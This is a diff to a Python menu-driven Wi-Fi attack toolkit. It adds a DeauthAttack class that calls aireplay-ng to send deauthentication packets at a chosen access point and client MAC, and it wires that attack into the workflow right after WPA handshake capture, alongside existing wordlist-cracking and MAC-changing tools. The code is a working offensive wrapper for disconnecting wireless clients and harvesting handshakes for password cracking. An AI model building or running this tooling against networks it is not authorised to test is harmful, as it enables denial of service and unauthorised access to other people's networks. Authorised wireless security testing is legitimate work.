@@ -1,9 +1,20 @@
 import subprocess
-import getmac
 from scan import WifiScan
 from network_scanner import ScanNetworkTool
 from mac_changer import MacChanger
 from scan import WordlistAttackTool
+
+
+class DeauthAttack:
+    def __init__(self, adapter):
+        self.adapter = adapter
+
+    def execute_attack(self, client_bssid, deauth_pack, client_mac):
+        '''Deauth attack function'''
+        print(f'Deauth attack against {client_bssid} on {client_mac} using {self.adapter}')
+        subprocess.run(
+            ['aireplay-ng', '--deauth', str(deauth_pack), '-a', client_bssid, '-c', client_mac, self.adapter],
+            check=True)
 
 
 def main():
@@ -34,6 +45,12 @@ def main():
             "wordlist_prompt": "[+] Input wordlist file: ",
             "tool_class": WordlistAttackTool,
             "tool_method": "run_wordlist_attack"
+        },
+        "5": {
+            "tool_name": "Deauth Attack",
+            "input_prompt": "[+] Input Wi-Fi adapter: ",
+            "tool_class": DeauthAttack,
+            "tool_method": "execute_attack"
         }
     }
 
@@ -61,15 +78,19 @@ def main():
                 handshake_file = input(tool_data['input_prompt'])
                 wordlist_file = input(tool_data['wordlist_prompt'])
                 tool_instance = tool_class(handshake_file, wordlist_file)
-            elif tool_data['tool_name'] == "WifiScan":
-                adapter = input_value
-                tool_instance = tool_class(adapter)
-                tool_instance.capture_handshake()
-                continue  # Return to the main menu
             else:
                 tool_instance = tool_class(input_value)
 
-            getattr(tool_instance, tool_method)()
+            if tool_data['tool_name'] == "WifiScan":
+                tool_instance.capture_handshake()
+                deauth_adapter = input("[+] Input Wi-Fi adapter for deauth attack: ")
+                deauth_instance = DeauthAttack(deauth_adapter)
+                client_bssid = input("[+] Input client BSSID: ")
+                deauth_pack = int(input("[+] Input number of deauth packets: "))
+                client_mac = input("[+] Input client MAC address: ")
+                deauth_instance.execute_attack(client_bssid, deauth_pack, client_mac)
+            else:
+                getattr(tool_instance, tool_method)()
         else:
             print("Invalid choice. Please try again.")
 
